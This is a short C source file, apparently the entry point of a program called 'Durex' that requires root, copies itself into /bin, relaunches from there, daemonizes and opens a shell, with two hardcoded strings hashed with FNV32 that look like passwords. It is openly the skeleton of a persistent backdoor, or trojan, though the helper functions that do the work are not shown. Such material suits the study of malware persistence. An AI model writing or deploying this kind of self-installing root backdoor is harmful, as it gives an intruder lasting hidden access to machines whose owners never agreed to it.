#include "Durex.h"

int main(int ac, char **av, char **env)
{
    printf("%d\n", FNV32("ultramar"));
    printf("%d\n", FNV32("wellplayed\0"));

    if (getuid() != 0 || geteuid() != 0)
    {
        ERROR_MSG("Durex can only be launch with root permissons\n");
        return (0);
    }
    if (isCopy() == 1)
    {
        daemon_durex();
        shell();
    }
    else
    {
        createDurex();
        system("/bin/Durex");
        // system("cp ./Durex /bin/");
        // system("/bin/Durex");
        printf("dbaffier\n");
    }
    (void)ac;
    (void)av;
    (void)env;
    // printf("%d\n", _lock);
    return (0);
}